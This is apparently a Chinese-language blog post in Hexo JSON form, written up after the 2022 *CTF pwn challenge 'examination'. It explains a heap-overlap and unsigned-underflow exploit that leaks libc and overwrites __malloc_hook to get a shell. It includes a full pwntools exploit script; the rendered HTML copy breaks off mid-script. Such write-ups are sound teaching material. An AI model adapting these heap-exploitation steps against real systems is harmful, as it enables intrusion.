{"title":"[2022*CTF] Pwn examination wp","date":"2022-04-19T03:19:30.000Z","toc":true,"source":"_posts/xinCTF-pwn-wp.md","raw":"---\ntitle: \"[2022*CTF] Pwn examination wp\"\ncomments: true\ntoc: true\ndate: 2022-04-19 11:19:30\ntags:  \n  - CTF\n  - Pwn\n---\n\n# 题目\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-04_%2ACTF/examination.zip\n\n# 解题\n\n角色扮演的pwn题，可以切换学生和老师\n\n发现了好多漏洞，估计是考漏洞的利用，当然解法可能就不止一种\n\n主要利用的漏洞：无符号数减法负数溢出，student role下的set mode中可以修改内存中的指针导致堆块堆叠\n\n只用到一次free\n\n思路，构造一个mode chunk使得这个chunk在comment chunk1的上方，以及另一个comment chunk2在其下方，然后pray一下，将指针下移16个字节，使得可以操控comment chunk的size位置，修改size为0x421绕过tcache，释放到unsorted bin，同时布置好comment chunk2的中伪造一个size位置，这个时候重新在分配一个和comment chunk1大小相同的commend chunk就会切割unsorted bin，使得main_arena的地址向后推移，写入comment chunk2，这个时候read comment chunk2就能够泄露libc基址，同样的手法，再add student，分配的student node和test node都会切割unsorted bin中的块，这个时候切割的unsorted bin就是之前堆块堆叠导致的comment chunk2，那我们就能够控制student node和test node，修改test node中的comment地址__malloc_hook，再向malloc_hook中写入ogg，再调用teacher role的pray，就能够getshell\n\n![image-20220419112429213](xinCTF-pwn-wp/image-20220419112429213.png)\n\n![image-20220419112443070](xinCTF-pwn-wp/image-20220419112443070.png)\n\n# Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='debug'\n# io = process(['./ld-2.31.so', './examination'], env={'LD_PRELOAD':'./libc-2.31.so'})\nio = remote('124.70.130.92', 60001)\n\nroleg = 0\nidg = -1\nlazy_map = {}\nreward_map = {}\n\ndef change_role(role):\n    global roleg, idg\n    roleg = role\n    if role == 0:\n        idg = -1\n    io.sendlineafter('choice>> ', '5')\n    io.sendlineafter('role: <0.teacher/1.student>: ', str(role))\n\ndef t_addstu(quesqtion_num):\n    (lambda x: (change_role(x) if roleg != x else 0))(0)\n    io.sendlineafter('choice>> ', '1')\n    rt = io.recv(5)\n    if 'enter' in rt:\n        io.sendlineafter('questions: ',str(quesqtion_num))\n    else:\n        print rt\n\ndef t_getshell():\n    (lambda x: (change_role(x) if roleg != x else 0))(0)\n    io.sendlineafter('choice>> ', '6')\n    \n\ndef t_givescore():\n    (lambda x: (change_role(x) if roleg != x else 0))(0)\n    io.sendlineafter('choice>> ', '2')\n    io.recvuntil('marking testing papers.....\\n')\n    rt = io.recvuntil('finish\\n', drop=True)\n    rt = rt.strip().split('\\n')\n    def f(ss):\n        ss = ss.replace('score for the ', '')\n        # print(ss)\n        a = int(ss[:ss.find('th')])\n        b = int(ss[ss.find('is ')+3:])\n        return (a, b)\n    ans = []\n    # print(rt)\n    for sr in rt:\n        # print(sr)\n        if 'b@d!' in sr:\n            continue\n        # print sr\n        ans.append(f(sr))\n    return ans\n\ndef t_comment(_id, comment, size):\n    (lambda x: (change_role(x) if roleg != x else 0))(0)\n    io.sendlineafter('choice>> ', '3')\n    io.sendlineafter('which one? > ', str(_id))\n    rt = io.recv(5)\n    if 'pleas' in rt:\n        io.sendlineafter('size of comment: ', str(size))\n    io.sendlineafter('ur comment:\\n', comment)\n\ndef t_free(_id):\n    (lambda x: (change_role(x) if roleg != x else 0))(0)\n    io.sendlineafter('choice>> ', '4')\n    io.sendlineafter('which student id to choose?\\n', str(_id))\n    lazy_map[_id] = 0\n    reward_map[_id] = 0\n\n\ndef s_change_id(_id):\n    global idg\n    (lambda x: (change_role(x) if roleg != x else 0))(1)\n    io.sendlineafter('choice>> ', '6')\n    io.sendlineafter('input your id: ', str(_id))\n    idg = _id\n\ndef s_pray(_id):\n    (lambda x: (change_role(x) if roleg != x else 0))(1)\n    (lambda x: (s_change_id(x) if idg != x else 0))(_id)\n    io.sendlineafter('choice>> ', '3')\n    lazy_map[_id] = 1 - lazy_map.get(_id, 0)\n\ndef s_set_mode(_id, mode):\n    (lambda x: (change_role(x) if roleg != x else 0))(1)\n    (lambda x: (s_change_id(x) if idg != x else 0))(_id)\n    io.sendlineafter('choice>> ', '4')\n    rt = io.recvuntil('\\n')\n    if 'mode' in rt:\n        io.sendline(mode)\n    else:\n        io.sendline(str(mode))\n\ndef s_check_review(_id, to_reward, fx, has_comment, tf=lambda x: x):\n    if reward_map.get(_id, 0) == 1:\n        return\n    if to_reward:\n        s_pray(_id)\n        while True:\n            tmp = t_givescore()\n            tmp = dict(tmp)\n            assert _id in tmp\n            if tmp[_id] < 10:\n                break\n    (lambda x: (change_role(x) if roleg != x else 0))(1)\n    (lambda x: (s_change_id(x) if idg != x else 0))(_id)\n    io.sendlineafter('choice>> ', '2')\n    if to_reward:\n        io.recvuntil('Good Job! Here is your reward! ')\n        target_addr = int(io.recvuntil('\\n', drop=True), 16)\n        tf(target_addr)\n        target_addr = fx(target_addr)\n        io.sendafter('add 1 to wherever you want! addr: ', str(target_addr))\n        reward_map[_id] = 1\n    if has_comment:\n        io.recvuntil('here is the review:\\n')\n        \n\n\nio.sendlineafter('role: <0.teacher/1.student>: ', str(roleg))\nfor i in range(7):\n    t_addstu(9)\n\n# t_comment(6, 'sss', )\n# s_set_mode(3, 'asdf')\ns_set_mode(4, 'asdf')\ns_set_mode(5, 'asdf')\n\nt_comment(6, 'sss', 0x300)\nt_comment(5, 'a'*0x100+p64(0)+p64(0x201), 0x300)\n\ns_pray(5)\ns_set_mode(5, 32)\ns_pray(5)\ns_set_mode(5, 'q'*8 + p64(0x421))\n\nt_free(6)\nt_comment(4, 'sss', 0x300)\n\ns_check_review(5, False, null, True)\nmain_arena = u64(io.recv(8)) - 96\n\nlibc_base = main_arena - 0x00001ECB80\nlog.success(\"libc_base: \" + hex(libc_base))\n\nt_addstu(1)\nt_comment(6, 'sss', 0x300)\n\nheap_addr = 0\ndef ftmp(addr):\n    global heap_addr\n    heap_addr = addr\n\ns_check_review(6, True, lambda x: x-0x10, True, ftmp)\nlog.success('heap_addr: ' + hex(heap_addr))\n\nlibc = ELF('./libc-2.31.so')\nmalloc_hook = libc.sym['__malloc_hook'] + libc_base\n\np = p64(heap_addr+0x30) + p64(0)*2 + p64(0x100000001) + p64(0) + p64(0x21) + p64(0x100000001) + p64(malloc_hook) + p64(8)\nt_comment(5, p, 0x300)\n\nogg = [0xe3b2e, 0xe3b31, 0xe3b34]\n\nt_comment(6, p64(ogg[1]+libc_base), 0x300)\n\nt_getshell()\n\n# gdb.attach(io)\n\nio.interactive()\n```\n\n","slug":"xinCTF-pwn-wp","published":true,"updated":"2025-10-28T08:00:40.778Z","_id":"cuidIdVhE3V1MnU5qOVptxdmn","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-04_%2ACTF/examination.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-04_%2ACTF/examination.zip</a></p>\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>角色扮演的pwn题，可以切换学生和老师</p>\n<p>发现了好多漏洞，估计是考漏洞的利用，当然解法可能就不止一种</p>\n<p>主要利用的漏洞：无符号数减法负数溢出，student role下的set mode中可以修改内存中的指针导致堆块堆叠</p>\n<p>只用到一次free</p>\n<p>思路，构造一个mode chunk使得这个chunk在comment chunk1的上方，以及另一个comment chunk2在其下方，然后pray一下，将指针下移16个字节，使得可以操控comment chunk的size位置，修改size为0x421绕过tcache，释放到unsorted bin，同时布置好comment chunk2的中伪造一个size位置，这个时候重新在分配一个和comment chunk1大小相同的commend chunk就会切割unsorted bin，使得main_arena的地址向后推移，写入comment chunk2，这个时候read comment chunk2就能够泄露libc基址，同样的手法，再add student，分配的student node和test node都会切割unsorted bin中的块，这个时候切割的unsorted bin就是之前堆块堆叠导致的comment chunk2，那我们就能够控制student node和test node，修改test node中的comment地址__malloc_hook，再向malloc_hook中写入ogg，再调用teacher role的pray，就能够getshell</p>\n<p><img src=\"/p/xinCTF-pwn-wp/image-20220419112429213.png\" alt=\"image-20220419112429213\"></p>\n<p><img src=\"/p/xinCTF-pwn-wp/image-20220419112443070.png\" alt=\"image-20220419112443070\"></p>\n<h1 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.31.so&#x27;, &#x27;./examination&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;124.70.130.92&#x27;</span>, <span class=\"number\">60001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">roleg = <span class=\"number\">0</span></span><br><span class=\"line\">idg = -<span class=\"number\">1</span></span><br><span class=\"line\">lazy_map = &#123;&#125;</span><br><span class=\"line\">reward_map = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">change_role</span>(<span class=\"params\">role</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> roleg, idg</span><br><span class=\"line\">    roleg = role</span><br><span class=\"line\">    <span class=\"keyword\">if</span> role == <span class=\"number\">0</span>:</span><br><span class=\"line\">        idg = -<span class=\"number\">1</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class=\"built_in\">str</span>(role))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_addstu</span>(<span class=\"params\">quesqtion_num</span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    rt = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;enter&#x27;</span> <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;questions: &#x27;</span>,<span class=\"built_in\">str</span>(quesqtion_num))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> rt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_getshell</span>():</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_givescore</span>():</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;marking testing papers.....\\n&#x27;</span>)</span><br><span class=\"line\">    rt = io.recvuntil(<span class=\"string\">&#x27;finish\\n&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    rt = rt.strip().split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">ss</span>):</span><br><span class=\"line\">        ss = ss.replace(<span class=\"string\">&#x27;score for the &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(ss)</span></span><br><span class=\"line\">        a = <span class=\"built_in\">int</span>(ss[:ss.find(<span class=\"string\">&#x27;th&#x27;</span>)])</span><br><span class=\"line\">        b = <span class=\"built_in\">int</span>(ss[ss.find(<span class=\"string\">&#x27;is &#x27;</span>)+<span class=\"number\">3</span>:])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (a, b)</span><br><span class=\"line\">    ans = []</span><br><span class=\"line\">    <span class=\"comment\"># print(rt)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> sr <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        <span class=\"comment\"># print(sr)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;b@d!&#x27;</span> <span class=\"keyword\">in</span> sr:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"comment\"># print sr</span></span><br><span class=\"line\">        ans.append(f(sr))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_comment</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, comment, size</span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;which one? &gt; &#x27;</span>, <span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    rt = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;pleas&#x27;</span> <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;size of comment: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ur comment:\\n&#x27;</span>, comment)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t_free</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">0</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;which student id to choose?\\n&#x27;</span>, <span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    lazy_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">    reward_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_change_id</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> idg</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;input your id: &#x27;</span>, <span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    idg = _<span class=\"built_in\">id</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_pray</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (s_change_id(x) <span class=\"keyword\">if</span> idg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    lazy_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">1</span> - lazy_map.get(_<span class=\"built_in\">id</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_set_mode</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, mode</span>):</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (s_change_id(x) <span class=\"keyword\">if</span> idg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    rt = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;mode&#x27;</span> <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        io.sendline(mode)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        io.sendline(<span class=\"built_in\">str</span>(mode))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s_check_review</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, to_reward, fx, has_comment, tf=<span class=\"keyword\">lambda</span> x: x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> reward_map.get(_<span class=\"built_in\">id</span>, <span class=\"number\">0</span>) == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> to_reward:</span><br><span class=\"line\">        s_pray(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            tmp = t_givescore()</span><br><span class=\"line\">            tmp = <span class=\"built_in\">dict</span>(tmp)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> _<span class=\"built_in\">id</span> <span class=\"keyword\">in</span> tmp</span><br><span class=\"line\">            <span class=\"keyword\">if</span> tmp[_<span class=\"built_in\">id</span>] &lt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (change_role(x) <span class=\"keyword\">if</span> roleg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"keyword\">lambda</span> x: (s_change_id(x) <span class=\"keyword\">if</span> idg != x <span class=\"keyword\">else</span> <span class=\"number\">0</span>))(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice&gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> to_reward:</span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class=\"line\">        target_addr = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">        tf(target_addr)</span><br><span class=\"line\">        target_addr = fx(target_addr)</span><br><span class=\"line\">        io.sendafter(<span class=\"string\">&#x27;add 1 to wherever you want! addr: &#x27;</span>, <span class=\"built_in\">str</span>(target_addr))</span><br><span class=\"line\">        reward_map[_<span class=\"built_in\">id</span>] = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> has_comment:</span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;here is the review:\\n&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class=\"built_in\">str</span>(roleg))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    t_addstu(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># t_comment(6, &#x27;sss&#x27;, )</span></span><br><span class=\"line\"><span class=\"comment\"># s_set_mode(3, &#x27;asdf&#x27;)</span></span><br><span class=\"line\">s_set_mode(<span class=\"number\">4</span>, <span class=\"string\">&#x27;asdf&#x27;</span>)</span><br><span class=\"line\">s_set_mode(<span class=\"number\">5</span>, <span class=\"string\">&#x27;asdf&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">t_comment(<span class=\"number\">6</span>, <span class=\"string\">&#x27;sss&#x27;</span>, <span class=\"number\">0x300</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">5</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x100</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x201</span>), <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s_pray(<span class=\"number\">5</span>)</span><br><span class=\"line\">s_set_mode(<span class=\"number\">5</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">s_pray(<span class=\"number\">5</span>)</span><br><span class=\"line\">s_set_mode(<span class=\"number\">5</span>, <span class=\"string\">&#x27;q&#x27;</span>*<span class=\"number\">8</span> + p64(<span class=\"number\">0x421</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">t_free(<span class=\"number\">6</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">4</span>, <span class=\"string\">&#x27;sss&#x27;</span>, <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s_check_review(<span class=\"number\">5</span>, <span class=\"literal\">False</span>, null, <span class=\"literal\">True</span>)</span><br><span class=\"line\">main_arena = u64(io.recv(<span class=\"number\">8</span>)) - <span class=\"number\">96</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">0x00001ECB80</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base: &quot;</span> + <span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">t_addstu(<span class=\"number\">1</span>)</span><br><span class=\"line\">t_comment(<span class=\"number\">6</span>, <span class=\"string\">&#x27;sss&#x27;</span>, <span class=\"number\">0x300</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">heap_addr = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ftmp</span>(<span class=\"params\">addr</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> heap_addr</span><br><span class=\"line\">    heap_addr = addr</span><br><span class=\"line\"></span><br><span class=\"line\">s_check_review(<span class=\"number\">6</span>, <span class=\"literal\">True</span>, <span class=\"keyword\">lambda</span> x: x-<span class=\"number\">0x10</span>, <span class=\"literal\">True</span>, ftmp)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_addr: &#x27;</span> + <span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = 